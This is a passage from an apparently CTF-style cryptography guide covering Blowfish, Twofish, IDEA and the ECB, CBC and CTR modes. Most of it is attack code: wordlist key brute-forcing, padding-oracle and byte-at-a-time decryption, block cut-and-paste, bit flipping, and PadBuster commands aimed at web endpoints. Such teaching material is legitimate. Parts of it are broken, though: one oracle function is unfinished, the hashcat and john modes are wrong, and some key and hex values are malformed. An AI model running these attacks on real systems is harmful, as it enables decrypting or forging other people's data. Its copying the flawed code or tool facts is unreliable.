openssl enc -aes-256-cbc -K 3132333435363738393031323334353637383940414243444546474849505152535455 -iv 00112233445566778899aabbccddeeff -in plaintext.txt -out ciphertext.bin

# Decrypt
openssl enc -d -aes-256-cbc -K [key_hex] -iv [iv_hex] -in ciphertext.bin -out decrypted.txt

# Brute force key with known plaintext
for key in $(cat wordlist.txt); do
    key_hex=$(echo -n "$key" | xxd -p | head -c 32)
    result=$(echo -n "known_plaintext" | openssl enc -aes-128-ecb -K $key_hex -nopad 2>/dev/null)
    if [ "$result" = "expected_ciphertext" ]; then
        echo "Key Found: $key"
    fi
done
```

**AES Brute Force (Known Plaintext):**

```python
from Crypto.Cipher import AES
import binascii

def bruteforce_aes_128(ciphertext_hex, plaintext_hex, wordlist_file):
    ciphertext = binascii.unhexlify(ciphertext_hex)
    plaintext = binascii.unhexlify(plaintext_hex)
    
    with open(wordlist_file, 'r') as f:
        for word in f:
            word = word.strip()
            # Expand word to 16 bytes for AES-128
            key = (word * 2)[:16].encode() if isinstance(word, str) else (word * 2)[:16]
            try:
                cipher = AES.new(key, AES.MODE_ECB)
                if cipher.encrypt(plaintext) == ciphertext:
                    print(f"AES-128 Key Found: {word}")
                    return key
            except:
                pass
    return None

bruteforce_aes_128("69c4e0d86a7b45b46", "48656c6c6f20576f726c6421212121", "/usr/share/wordlists/rockyou.txt")
```

**Padding Oracle Attack (PyCryptodome):**

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import binascii

def padding_oracle_attack(ciphertext_hex, key):
    """
    Assumes oracle returns True if padding is valid, False otherwise.
    Decrypt byte-by-byte by modifying ciphertext.
    """
    ciphertext = binascii.unhexlify(ciphertext_hex)
    block_size = 16
    plaintext = b''
    
    for block_num in range(len(ciphertext) // block_size):
        block_start = block_num * block_size
        block_end = block_start + block_size
        
        for byte_pos in range(block_size - 1, -1, -1):
            for byte_val in range(256):
                # Modify ciphertext at position
                modified_ct = bytearray(ciphertext)
                modified_ct[block_start + byte_pos] = byte_val
                
                # Check if oracle accepts (padding is valid)
                try:
                    cipher = AES.new(key, AES.MODE_CBC, ciphertext[block_start-16:block_start])
                    result = cipher.decrypt(bytes(modified_ct[block_start:block_end]))
                    # If last byte is valid padding, this is correct
                    # (Implementation detail: actual oracle check omitted)
                except:
                    pass
    
    return plaintext
```

**Kali Linux: hashcat AES cracking:**

```bash
# AES brute force (very slow without GPU)
hashcat -m 13100 -a 0 aes_hash.txt /usr/share/wordlists/rockyou.txt

# Or use john the ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=aes aes_hash.txt
```

**Online AES Decryption Verification (CyberChef):**

Use CyberChef (https://gchq.github.io/CyberChef/) for quick AES operations:

- Recipe: AES Decrypt
- Input: ciphertext (hex)
- Key: key (hex)
- IV: initialization vector (hex, if applicable)
- Mode: ECB/CBC/CTR/GCM as needed

---

### Blowfish

Blowfish encrypts 64-bit blocks using 32 to 448-bit keys through 16 rounds. Designed by Bruce Schneier in 1993, Blowfish is considered secure but rarely used in new systems due to small block size (64 bits) and performance advantages of AES.

#### Encryption Process

Blowfish applies 16 Feistel rounds, each using four substitution boxes (S-boxes) indexed by round key-derived values and plaintext bits. Fast software implementation and simple key schedule make Blowfish suitable for many applications.

#### CTF Vulnerabilities

**Small Block Size (64 bits):** [Inference] With 2³² possible ciphertext blocks, birthday attacks become feasible after ~2³² encryptions of related plaintexts. Not directly exploitable in most CTF scenarios but relevant for long-message encryption.

**Weak Keys:** [Unverified] Some key material (all zeros, repeated patterns) may produce biased S-boxes, though practical impact is minimal.

**ECB Mode Vulnerability:** Identical plaintext blocks encrypt to identical ciphertext blocks.

#### CTF Tools and Commands

**Python Blowfish Encryption (PyCryptodome):**

```python
from Crypto.Cipher import Blowfish
import binascii

key = b'MySecretKey1234'  # 8-448 bits

plaintext = b'Hello!!!'  # 8 bytes (Blowfish block size)

cipher = Blowfish.new(key, Blowfish.MODE_ECB)
ciphertext = cipher.encrypt(plaintext)
print(f"Blowfish Ciphertext: {binascii.hexlify(ciphertext)}")

decipher = Blowfish.new(key, Blowfish.MODE_ECB)
decrypted = decipher.decrypt(ciphertext)
print(f"Decrypted: {decrypted}")
```

**OpenSSL Blowfish:**

```bash
# Blowfish-ECB encryption
echo -n "Hello!!!" | openssl enc -bf-ecb -K 4d795365637265744b657931323334 -nopad | xxd

# Blowfish-CBC
echo -n "Hello!!!" | openssl enc -bf-cbc -K 4d795365637265744b657931323334 -iv 0102030405060708 -nopad | xxd

# Decrypt
openssl enc -d -bf-ecb -K [key_hex] -in ciphertext.bin -out plaintext.txt -nopad
```

**Blowfish Brute Force:**

```python
from Crypto.Cipher import Blowfish
import binascii

def bruteforce_blowfish(ciphertext_hex, plaintext_hex, wordlist_file):
    ciphertext = binascii.unhexlify(ciphertext_hex)
    plaintext = binascii.unhexlify(plaintext_hex)
    
    with open(wordlist_file, 'r') as f:
        for word in f:
            word = word.strip().encode()
            if len(word) > 56:  # Blowfish max key is 448 bits (56 bytes)
                word = word[:56]
            try:
                cipher = Blowfish.new(word, Blowfish.MODE_ECB)
                if cipher.encrypt(plaintext) == ciphertext:
                    print(f"Blowfish Key Found: {word.decode()}")
                    return word
            except:
                pass
    return None
```

---

### Twofish

Twofish encrypts 128-bit blocks using 128, 192, or 256-bit keys through 16 rounds. Designed by Bruce Schneier as AES finalist, Twofish is cryptographically secure but less standardized than AES. Rarely encountered in modern systems but may appear in CTF challenges.

#### Encryption Process

Twofish combines Feistel structure with pre-whitening (XOR with subkeys before first round) and post-whitening (XOR after last round). Complex key-dependent S-box construction and MDS matrix operations provide security.

#### CTF Vulnerabilities

**Limited Cryptanalysis:** [Unverified] Full Twofish remains unbroken, but no reduced-round attacks significantly lower complexity. Most CTF exploits focus on implementation flaws or weak key management rather than cryptographic weakness.

#### CTF Tools and Commands

**Python Twofish Encryption (twofish library):**

```bash
# Install twofish
pip install twofish
```

```python
from twofish import Twofish
import binascii

key = b'1234567890123456'  # 16 bytes (128-bit)

plaintext = b'Hello World!!!!!'  # 16 bytes

cipher = Twofish(key)
ciphertext = cipher.encrypt(plaintext)
print(f"Twofish Ciphertext: {binascii.hexlify(ciphertext)}")

decrypted = cipher.decrypt(ciphertext)
print(f"Decrypted: {decrypted}")
```

**Twofish Brute Force:**

```python
from twofish import Twofish
import binascii

def bruteforce_twofish(ciphertext_hex, plaintext_hex, wordlist_file):
    ciphertext = binascii.unhexlify(ciphertext_hex)
    plaintext = binascii.unhexlify(plaintext_hex)
    
    with open(wordlist_file, 'r') as f:
        for word in f:
            word = word.strip().encode()
            # Pad to 16 bytes for Twofish-128
            key = (word * 2)[:16]
            try:
                cipher = Twofish(key)
                if cipher.encrypt(plaintext) == ciphertext:
                    print(f"Twofish Key Found: {word.decode()}")
                    return key
            except:
                pass
    return None
```

---

### IDEA (International Data Encryption Algorithm)

IDEA encrypts 64-bit blocks using 128-bit keys through 8 rounds, plus output transformation. Designed in 1991, IDEA combines operations from different algebraic structures (XOR, modular addition, modular multiplication) to resist linear and differential cryptanalysis.

#### Encryption Process

IDEA uses mixed operations: XOR (bitwise), addition modulo 2¹⁶, and multiplication modulo 2¹⁶+1. This heterogeneity prevents algebraic attacks. Eight rounds process 16-bit subblocks, with subkey generation from the 128-bit master key.

#### CTF Vulnerabilities

**Weak Key Classes:** [Unverified] Some key material (particularly with repeated patterns) may weaken S-box properties, though practical exploitation remains limited.

**ECB Mode Vulnerability:** Standard ECB weaknesses apply.

**Patent Expiration:** IDEA patents expired around 2012, increasing its adoption and audit frequency.

#### CTF Tools and Commands

**Python IDEA Encryption (pycryptodome alternative or openssl):**

```bash
# IDEA support in PyCryptodome is limited; use OpenSSL instead
```

**OpenSSL IDEA Operations:**

```bash
# IDEA-ECB encryption
echo -n "Hello!!!" | openssl enc -idea-ecb -K 0123456789abcdef0123456789abcdef -nopad | xxd

# IDEA-CBC
echo -n "Hello!!!" | openssl enc -idea-cbc -K 0123456789abcdef0123456789abcdef -iv 0102030405060708 -nopad | xxd

# Decrypt IDEA
openssl enc -d -idea-cbc -K [key_hex] -iv [iv_hex] -in ciphertext.bin -out plaintext.txt
```

**IDEA Brute Force via OpenSSL:**

```python
import subprocess
import binascii

def bruteforce_idea(ciphertext_hex, plaintext_hex, wordlist_file):
    ciphertext = binascii.unhexlify(ciphertext_hex)
    plaintext = binascii.unhexlify(plaintext_hex)
    
    with open(wordlist_file, 'r') as f:
        for word in f:
            word = word.strip()
            # Pad to 16 bytes for IDEA-128
            key = (word * 2)[:16]
            key_hex = binascii.hexlify(key.encode()).decode()
            
            try:
                result = subprocess.run(
                    f"echo -n '{plaintext_hex}' | xxd -r -p | openssl enc -idea-ecb -K {key_hex} -nopad | xxd -p",
                    shell=True, capture_output=True, text=True
                )
                if result.stdout.strip() == ciphertext_hex:
                    print(f"IDEA Key Found: {word}")
                    return key
            except:
                pass
    
    return None
```

---

### Practical CTF Attack Workflow for Block Ciphers

**Identification Phase:**

Determine block cipher from ciphertext length patterns (64-bit: DES/3DES/Blowfish/IDEA; 128-bit: AES/Twofish), key size clues, or challenge hints. Analyze ciphertext for ECB mode patterns (repeated blocks indicate identical plaintext).

**Mode Detection:**

- ECB: Identical plaintext blocks → identical ciphertext blocks
- CBC: Ciphertext depends on IV and all previous blocks
- CTR/GCM: Streaming behavior with keystream reuse

**Vulnerability Testing:**

Check for known plaintext availability (enables key recovery via brute force + verification). Test ECB mode properties if suspected. Attempt dictionary attacks on weak key derivation (password-based encryption). Check for padding oracle vulnerability if ciphertext length matches (n*blocksize + padding).

**Key Recovery Priority:**

1. Weak/default keys (DES weak keys, all-zeros, repeated patterns)
2. Dictionary-based key derivation (PBKDF2 with weak passwords)
3. Known plaintext brute force (wordlist + verification)
4. Side-channel exploitation (timing, power analysis - advanced)

**Decryption Verification:**

Decrypted plaintext should contain recognizable patterns (flag format, English text, valid file headers) to confirm correct key recovery.

---

## Modes of Operation

### ECB (Electronic Codebook)

ECB is the simplest block cipher mode where each plaintext block is independently encrypted with the same key. Identical plaintext blocks produce identical ciphertext blocks, revealing patterns.

**How ECB Works**

```
Encryption: C[i] = E(K, P[i])
Decryption: P[i] = D(K, C[i])

Where:
- P[i] = plaintext block i
- C[i] = ciphertext block i
- K = encryption key
- E/D = encryption/decryption function
```

**Detecting ECB Mode**

```python
# ecb_detector.py
def detect_ecb(ciphertext, block_size=16):
    """Detect ECB by finding duplicate blocks"""
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# Usage
cipher = bytes.fromhex("d880619740a8a19b7840a8a31c810a3d...")
if detect_ecb(cipher):
    print("ECB mode detected!")
    
# Count duplicate blocks
from collections import Counter
blocks = [cipher[i:i+16].hex() for i in range(0, len(cipher), 16)]
duplicates = {k: v for k, v in Counter(blocks).items() if v > 1}
print(f"Duplicate blocks: {duplicates}")
```

**Visual ECB Detection (Image Analysis)**

```bash
# Extract ECB-encrypted image patterns
# Famous ECB Penguin example

# Split encrypted image into blocks, visualize repetition
python3 << 'EOF'
from PIL import Image
import numpy as np

# Load encrypted image bytes
with open('encrypted_image.bin', 'rb') as f:
    data = f.read()

# Reshape into image dimensions (must know dimensions)
img_array = np.frombuffer(data, dtype=np.uint8).reshape(height, width, channels)
img = Image.fromarray(img_array)
img.save('ecb_pattern.png')
EOF
```

**ECB Byte-at-a-Time Attack**

Exploits ECB's deterministic nature when attacker controls prefix to encrypted data.

```python
# ecb_byte_at_a_time.py
def oracle_encrypt(user_input, secret_suffix, key):
    """Simulated encryption oracle: encrypt(user_input || secret_suffix)"""
    from Crypto.Cipher import AES
    plaintext = user_input + secret_suffix
    # Pad to block size
    pad_len = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad_len]) * pad_len
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(plaintext)

def exploit_ecb_oracle(oracle_func, block_size=16):
    """Extract secret suffix byte by byte"""
    secret = b''
    
    # Determine secret length
    base_len = len(oracle_func(b''))
    secret_len = base_len  # Initial estimate
    
    for secret_pos in range(secret_len):
        # Align target byte at end of block
        padding_len = (block_size - 1 - (secret_pos % block_size))
        prefix = b'A' * padding_len
        
        # Get target block with unknown byte
        target_cipher = oracle_func(prefix)
        target_block_idx = secret_pos // block_size
        target_block = target_cipher[target_block_idx * block_size:
                                      (target_block_idx + 1) * block_size]
        
        # Build dictionary of all possible bytes
        for byte_val in range(256):
            test_input = prefix + secret + bytes([byte_val])
            test_cipher = oracle_func(test_input)
            test_block = test_cipher[target_block_idx * block_size:
                                      (target_block_idx + 1) * block_size]
            
            if test_block == target_block:
                secret += bytes([byte_val])
                print(f"Found byte {secret_pos}: {chr(byte_val) if 32 <= byte_val < 127 else '?'}")
                break
        else:
            # Reached padding
            break
    
    return secret

# Example usage
from Crypto.Cipher import AES
import os

key = os.urandom(16)
secret = b"flag{ecb_is_weak}"

oracle = lambda data: oracle_encrypt(data, secret, key)
recovered = exploit_ecb_oracle(oracle)
print(f"Recovered secret: {recovered}")
```

**ECB Cut-and-Paste Attack**

Rearrange encrypted blocks to create valid ciphertexts with different plaintexts.

```python
# ecb_cut_paste.py
def ecb_cut_paste_attack():
    """
    Scenario: Encryption oracle that encrypts "email=USER&role=user"
    Goal: Create ciphertext that decrypts to "email=USER&role=admin"
    """
    
    # Step 1: Encrypt input to get "admin" at block boundary
    # Input: "AAAAAAAAAAadmin\x0b\x0b\x0b..." (pad admin to full block)
    block_size = 16
    admin_block_input = b'A' * 10 + b'admin' + b'\x0b' * 11  # PKCS7 padding
    cipher1 = oracle_encrypt(admin_block_input)
    admin_block = cipher1[block_size:block_size*2]  # Extract "admin" block
    
    # Step 2: Encrypt input to position "user" at final block
    # Input: "AAAAAAAAAAuser" -> "email=AAAAAAAAAAuser&role=user"
    user_input = b'A' * 13  # Align to get clean block boundaries
    cipher2 = oracle_encrypt(user_input)
    
    # Step 3: Replace final block with admin block
    forged_cipher = cipher2[:-block_size] + admin_block
    
    # Decrypt forged cipher -> "email=AAA...&role=admin"
    return forged_cipher

# This demonstrates privilege escalation via ECB block manipulation
```

**ECB Decryption via Known Plaintext**

```python
# ecb_known_plaintext.py
def ecb_decrypt_with_known_blocks(ciphertext, known_pairs, block_size=16):
    """
    Decrypt ECB ciphertext using known plaintext-ciphertext block pairs
    known_pairs: dict of {ciphertext_block: plaintext_block}
    """
    plaintext = b''
    blocks = [ciphertext[i:i+block_size] 
              for i in range(0, len(ciphertext), block_size)]
    
    for block in blocks:
        if block in known_pairs:
            plaintext += known_pairs[block]
        else:
            plaintext += b'?' * block_size  # Unknown block
    
    return plaintext

# Build dictionary from known encryptions
known = {}
for plain_block in [b'flag{', b'admin', b'user_', ...]:
    cipher_block = encrypt_ecb(plain_block, key)
    known[cipher_block] = plain_block
```

**Tools for ECB Analysis**

```bash
# OpenSSL ECB encryption/decryption
openssl enc -aes-128-ecb -in plaintext.txt -out cipher.bin -K $(xxd -p -c32 key.bin)
openssl enc -d -aes-128-ecb -in cipher.bin -out decrypted.txt -K $(xxd -p -c32 key.bin)

# CyberChef recipe for ECB
# Input ciphertext → AES Decrypt → Mode: ECB → Key: [hex_key]

# Detect ECB in file
python3 -c "
data = open('cipher.bin', 'rb').read()
blocks = [data[i:i+16] for i in range(0, len(data), 16)]
print(f'Unique blocks: {len(set(blocks))}/{len(blocks)}')
if len(set(blocks)) < len(blocks):
    print('ECB likely detected!')
"
```

**CTF-Specific ECB Exploitation**

```bash
# Common CTF scenarios:
# 1. ECB oracle with controlled prefix (byte-at-a-time attack)
# 2. ECB-encrypted images (visual pattern recognition)
# 3. Authentication token manipulation (cut-and-paste)
# 4. File encryption with known headers (PNG, PDF, etc.)

# Automated ECB exploitation framework
git clone https://github.com/mpgn/ECB-Byte-at-a-Time-Attack
python3 ecb_exploit.py --url http://target.com/encrypt --block-size 16
```

**Weaknesses Summary**

- Identical plaintext blocks → identical ciphertext blocks (pattern leakage)
- No diffusion between blocks (enables cut-and-paste attacks)
- Deterministic encryption (not IND-CPA secure) [Inference: Based on cryptographic security definitions]
- Vulnerable to chosen-plaintext attacks with encryption oracle access

---

### CBC (Cipher Block Chaining)

CBC mode XORs each plaintext block with the previous ciphertext block before encryption. First block uses an Initialization Vector (IV).

**How CBC Works**

```
Encryption:
C[0] = E(K, P[0] ⊕ IV)
C[i] = E(K, P[i] ⊕ C[i-1])

Decryption:
P[0] = D(K, C[0]) ⊕ IV
P[i] = D(K, C[i]) ⊕ C[i-1]
```

**CBC Padding Oracle Attack**

Most powerful CBC attack. Exploits padding validation error messages to decrypt ciphertext without knowing the key.

```python
# padding_oracle.py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def padding_oracle(ciphertext, iv, oracle_func):
    """
    oracle_func: Returns True if padding valid, False if invalid
    Decrypts entire ciphertext block by block
    """
    block_size = 16
    blocks = [iv] + [ciphertext[i:i+block_size] 
                      for i in range(0, len(ciphertext), block_size)]
    plaintext = b''
    
    # Decrypt each block
    for block_idx in range(1, len(blocks)):
        decrypted_block = bytearray(block_size)
        
        # Decrypt byte by byte (right to left)
        for byte_pos in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_pos
            
            # Craft malicious IV
            crafted_iv = bytearray(block_size)
            
            # Set known bytes to produce correct padding
            for known_pos in range(byte_pos + 1, block_size):
                crafted_iv[known_pos] = (decrypted_block[known_pos] ^ 
                                         padding_value)
            
            # Brute force current byte
            for guess in range(256):
                crafted_iv[byte_pos] = guess
                
                # Test with oracle
                test_cipher = bytes(crafted_iv) + blocks[block_idx]
                if oracle_func(test_cipher):
                    # Found valid padding
                    decrypted_block[byte_pos] = guess ^ padding_value
                    break
        
        # XOR with previous ciphertext block to get plaintext
        plain_block = bytes(a ^ b for a, b in zip(decrypted_block, 
                                                    blocks[block_idx - 1]))
        plaintext += plain_block
    
    return plaintext

# Example oracle function
def oracle(ciphertext):
    """Returns True if padding is valid"""
    try:
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv=ciphertext[:16])
        plaintext = cipher.decrypt(ciphertext[16:])
        unpad(plaintext, 16)  # Raises exception if padding invalid
        return True
    except:
        return False

# Usage
iv = ciphertext[:16]
ct = ciphertext[16:]
decrypted = padding_oracle(ct, iv, oracle)
print(f"Decrypted: {decrypted}")
```

**Automated Padding Oracle Tools**

```bash
# PadBuster - automated padding oracle exploitation
git clone https://github.com/AonCyberLabs/PadBuster
perl padBuster.pl http://target.com/decrypt ENCRYPTED_SAMPLE 16 \
  -encoding 2 \
  -cookies "auth=ENCRYPTED_COOKIE"

# Python implementation
pip3 install padding-oracle-attacker
padding-oracle-attacker -u "http://target.com/api" \
  -c "session=CIPHERTEXT" \
  --block-size 16 \
  --error "Invalid padding"
```

**CBC Bit Flipping Attack**

Exploits CBC decryption property: flipping bit in C[i] flips corresponding bit in P[i+1].

```python
# cbc_bit_flip.py
def cbc_bit_flip_attack(ciphertext, iv, block_size=16):
    """
    Scenario: Encrypted data contains "user=guest;role=user"
    Goal: Flip bits to create "user=guest;role=admin"
    """
    
    # Locate target block (assume "role=user" is in block 2)
    target_plain = b"role=user"
    desired_plain = b"role=admin"
    
    # Calculate required bit flips
    blocks = [iv] + [ciphertext[i:i+block_size] 
                      for i in range(0, len(ciphertext), block_size)]
    
    # Modify block 1 to flip bits in block 2
    modified_block = bytearray(blocks[1])  # Block before target
    
    for i, (current, desired) in enumerate(zip(target_plain, desired_plain)):
        if current != desired:
            # XOR positions: original ^ current ^ desired
            modified_block[i] ^= current ^ desired
    
    # Reconstruct ciphertext
    forged_cipher = bytes(modified_block) + blocks[2]
    
    return forged_cipher

# Example: Change "admin=0" to "admin=1"
# Original: "username=hacker;admin=0;timestamp=..."
# Locate "admin=0" in decrypted block, flip '0' to '1' via previous block
```

**CBC-R (Padding Oracle for Encryption)**

Reverse padding oracle: use decryption oracle to encrypt arbitrary plaintext.

```python
# cbc_encryption_via_oracle.py
def encrypt_with_padding_oracle(plaintext, block_size, oracle_func):
    """
    Use padding oracle to encrypt chosen plaintext
    Works by reversing the decryption process
    """
    from Crypto.Util.Padding import pad
    
    plaintext = pad(plaintext, block_size)
    blocks = [plaintext[i:i+block_size] 
              for i in range(0, len(plaintext), block_size)]
    
    ciphertext_blocks = []
    iv = b'\x00' * block_size  # Start with null IV
    
    for plain_block in reversed(blocks):
        # Find ciphertext block that decrypts to desired plaintext
        decrypted_block = bytearray(block_size)
        
        # Use padding oracle to find intermediate value
        for byte_pos in range(block_size - 1, -1, -1):
            padding_value = block_size - byte_pos
            
            crafted_block = bytearray(block_size)
            for known_pos in range(byte_pos + 1, block_size):
                crafted_block[known_pos] = (decrypted_block[known_pos] ^ 
                                            padding_value)
            
            for guess in range(256):
                crafted_block[byte_pos] = guess
                test_cipher = bytes(crafted_block) + b'\x00' * block_size
                
                if oracle_func(test_cipher):
                    decrypted_block[byte_pos] = guess ^ padding_value
                    break
        
        # Calculate ciphertext block: intermediate ⊕ plaintext
        cipher_block = bytes(a ^ b for a, b in zip(decrypted_block, plain_block))
        ciphertext_blocks.insert(0, cipher_block)
    
    return b''.join(ciphertext_blocks)
```

**IV Manipulation**

```python
# cbc_iv_attack.py
# In CBC, first plaintext block: P[0] = D(K, C[0]) ⊕ IV
# Attacker can modify IV to control P[0] without key

def forge_first_block(ciphertext, current_iv, current_plaintext, desired_plaintext):
    """
    Calculate IV needed to make first block decrypt to desired plaintext
    """
    # P[0] = D(K, C[0]) ⊕ IV
    # Therefore: IV' = IV ⊕ P[0] ⊕ P'[0]
    
    forged_iv = bytes(iv ^ old ^ new 
                      for iv, old, new in zip(current_iv, 
                                              current_plaintext, 
                                              desired_plaintext))
    return forged_iv

# Example: Change "user=guest" to "user=admin" in first block
original_iv = bytes.fromhex("...")
current_plain = b"user=guest;role="
desired_plain = b"user=admin;role="

new_iv = forge_first_block(ciphertext, original_iv, current_plain, desired_plain)
# Send (new_iv || ciphertext) to decrypt as "user=admin;role=..."
```

**Tools and Commands**

```bash
# OpenSSL CBC mode
openssl enc -aes-256-cbc -in plain.txt -out cipher.bin \
  -K $(xxd -p key.bin) -iv $(xxd -p iv.bin)

openssl enc -d -aes-256-cbc -in cipher.bin -out decrypted.txt \
  -K $(xxd -p key.bin) -iv $(xxd -p iv.bin)

# Detect padding oracle vulnerability
python3 << 'EOF'
import requests

def test_padding_oracle(url, ciphertext):
    # Flip last byte of ciphertext
    modified = bytearray.fromhex(ciphertext)
    modified[-1] ^= 0x01
    
    r1 = requests.get(url, params={'data': ciphertext})
    r2 = requests.get(url, params={'data': modified.hex()})
    
    # Different error messages indicate padding oracle
    if r1.text != r2.text and 'padding' in r2.text.lower():
        print("Padding oracle detected!")
        return True
    return False
EOF
```

**CTF Scenarios**

```python
# Common CBC CTF challenges:
# 1. Padding oracle on web session cookies
# 2. Bit flipping to escalate privileges
# 3. IV reuse leading to plaintext recovery
# 4. CBC-MAC forgery

# Example: Detect padding oracle in web app
import requests

base_url = "http://challenge.ctf/decrypt"
test_cipher = "a1b2c3d4e5f6..."

for i in range(256):
    modified = bytearray.fromhex(test_cipher)
    modified[-1] = i
    response = requests.post(base_url, data={'ct': modified.hex()})
    
    if "padding" in response.text.lower():
        print(f"Padding oracle confirmed at byte value: {i}")
        break
```

**Weaknesses Summary**

- Padding validation leaks decryption state (padding oracle)
- Bit flipping in C[i] affects P[i+1] predictably
- IV must be unpredictable; if attacker-controlled, first block is malleable
- Vulnerable to chosen-ciphertext attacks with decryption oracle

---

### CTR (Counter Mode)

CTR mode converts block cipher into stream cipher. Encrypts sequential counter values, then XORs with plaintext. No padding required.

**How CTR Works**

```
Encryption/Decryption (same operation):
C[i] = P[i] ⊕ E(K, Nonce || Counter[i])
P[i] = C[i] ⊕ E(K, Nonce || Counter[i])

Where:
- Nonce: unique value per message (typically 96 bits for AES-CTR)
- Counter: increments for each block (typically 32 bits)
```

**CTR Implementation**

```python
# ctr_mode.py
from Crypto.Cipher import AES
from Crypto.Util import Counter
import os

def ctr_encrypt(plaintext, key, nonce):
    """Manual CTR implementation"""
    counter = Counter.new(128, initial_value=int.from_bytes(nonce, 'big'))
    cipher = AES.new(key, AES.MODE_CTR, counter=counter)
    return cipher.encrypt(plaintext)

def ctr_decrypt(ciphertext, key, nonce):
    """CTR decryption (identical to encryption)"""
    counter = Counter.new(128, initial_value=int.from_bytes(nonce, 'big'))
    cipher = AES.new(key, AES.MODE_CTR, counter=counter)
    return cipher.decrypt(ciphertext)

# Using PyCryptodome library
key = os.urandom(16)
nonce = os.urandom(8)
cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
ciphertext = cipher.encrypt(b"flag{ctr_mode_example}")

# Decryption uses same process
cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
plaintext = cipher.decrypt(ciphertext)
```

**Nonce Reuse Attack**

Critical vulnerability: reusing nonce with same key allows XOR-based plaintext recovery.

```python
# ctr_nonce_reuse.py
def ctr_nonce_reuse_attack(ct1, ct2, known_plaintext1=None):
    """
    If same nonce used for two messages:
    C1 = P1 ⊕ KeyStream
    C2 = P2 ⊕ KeyStream
    Therefore: C1 ⊕ C2 = P1 ⊕ P2
    """
    
    # XOR two ciphertexts
    xor_result = bytes(a ^ b for a, b in zip(ct1, ct2))
    
    if known_plaintext1:
        # If P1 known, recover P2
        plaintext2 = bytes(a ^ b for a, b in zip(xor_result, known_plaintext1))
        return plaintext2
    else:
        # Crib dragging: try common phrases
        cribs = [b'flag{', b'password', b'secret', b'the ', b'CTF{']
        
        for crib in cribs:
            for offset in range(len(xor_result) - len(crib)):
                potential_p2 = bytes(xor_result[offset+i] ^ crib[i] 
                                     for i in range(len(crib)))
                
                # Check if result looks like plaintext
                if all(32 <= b < 127 for b in potential_p2):
                    print(f"Possible match at offset {offset}: {potential_p2}")

# Example usage
ct1 = bytes.fromhex("a1b2c3d4e5f6...")
ct2 = bytes.fromhex("f6e5d4c3b2a1...")
known_p1 = b"flag{this_is_message_one}"

recovered_p2 = ctr_nonce_reuse_attack(ct1, ct2, known_p1)
print(f"Message 2: {recovered_p2}")
```

**Keystream Recovery**

```python
# ctr_keystream_recovery.py
def recover_ctr_keystream(plaintext, ciphertext):
    """
    Since C = P ⊕ KeyStream
    KeyStream = P ⊕ C
    """
    keystream = bytes(p ^ c for p, c in zip(plaintext, ciphertext))
    return keystream

def reuse_keystream(keystream, target_ciphertext):
    """Decrypt other messages encrypted with same nonce"""
    return bytes(k ^ c for k, c in zip(keystream, target_ciphertext))

# If one plaintext-ciphertext pair is known:
known_plain = b"GET / HTTP/1.1\r\nHost: example.com"
known_cipher = bytes.fromhex("...")

keystream = recover_ctr_keystream(known_plain, known_cipher)

# Use keystream to decrypt other ciphertexts (same nonce)
other_cipher = bytes.fromhex("...")
decrypted = reuse_keystream(keystream, other_cipher)
```

**Many-Time Pad Attack (Multiple Nonce Reuse)**

```python
# ctr_many_time_pad.py
def solve_many_time_pad(ciphertexts, known_cribs=None):
    """
    Given multiple ciphertexts encrypted with same keystream,
    use statistical analysis and crib dragging to recover plaintexts
    """
    import string
    
    # XOR all ciphertexts together to eliminate keystream
    xor_pairs = []
    for i in range(len(ciphertexts)):
        for j in range(i + 1, len(ciphertexts)):
            xor_pairs.append((i, j, bytes(a ^ b for a, b in 
                                          zip(ciphertexts[i], ciphertexts[j]))))
    
    # Crib dragging on XOR pairs
    cribs = [b'flag{', b' the ', b'password', b'secret', 
             b'admin', b'CTF{', b'user']
    
    findings = []
    for idx1, idx2, xor_result in xor_pairs:
        for crib in cribs:
            for pos in range(len(xor_result) - len(crib)):
                candidate = bytes(xor_result[pos+i] ^ crib[i] 
                                  for i in range(len(crib)))
                
                # Check if looks like ASCII text
                if all(c in string.printable.encode() for c in candidate):
                    findings.append({
                        'ct1': idx1,
                        'ct2': idx2,
                        'position': pos,
                        'crib': crib,
                        'found': candidate
                    })
    
    return findings

# Example with 3 ciphertexts encrypted under same nonce
ciphertexts = [
    bytes.fromhex("a1b2c3d4..."),
    bytes.fromhex("e5f6a7b8..."),
    bytes.fromhex("c9d0e1f2...")
]

results = solve_many_time_pad(ciphertexts)
for r in results:
    print(f"CT{r['ct1']} position {r['position']}: {r['found']}")
```

**Bit Flipping Attack**

Like any stream cipher, CTR is malleable: flipping bit in ciphertext flips same bit in plaintext.

```python
# ctr_bit_flip.py
def ctr_bit_flip(ciphertext, known_plaintext, desired_plaintext):
    """
    Modify ciphertext to decrypt to desired plaintext
    C = P ⊕ KeyStream
    C' = P' ⊕ KeyStream = C ⊕ P ⊕ P'
    """
    modified = bytearray(ciphertext)
    
    for i, (known, desired) in enumerate(zip(known_plaintext, desired_plaintext)):
        modified[i] ^= known ^ desired
    
    return bytes(modified)

# Example: Change "user=guest" to "user=admin"
original_ct = bytes.fromhex("...")
known_pt = b"user=guest;role=user"
desired_pt = b"user=admin;role=user"

forged_ct = ctr_bit_flip(original_ct, known_pt, desired_pt)
# Forged ciphertext will decrypt to "user=admin;role=user"
```

**Tools and Commands**

```bash
# OpenSSL CTR mode (note: OpenSSL uses "CTR" suffix)
openssl enc -aes-256-ctr -in plaintext.txt -out cipher.bin \
  -K $(xxd -p key.bin) -iv $(xxd -p nonce_counter.bin)

openssl enc -d -aes-256-ctr -in cipher.bin -out decrypted.txt \
  -K $(xxd -p key.bin) -iv $(xxd -p nonce_counter.bin)

# Python command-line CTR encryption
python3 << 'EOF'
from Crypto.Cipher import AES
import sys

key = bytes.fromhex(sys.argv[1])  # 32 hex chars for AES-128
nonce = bytes.fromhex(sys.argv[2])  # 16 hex chars

cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
plaintext = input("Enter plaintext: ").encode()
ciphertext = cipher.encrypt(plaintext)
print(f"Ciphertext: {ciphertext.hex()}")
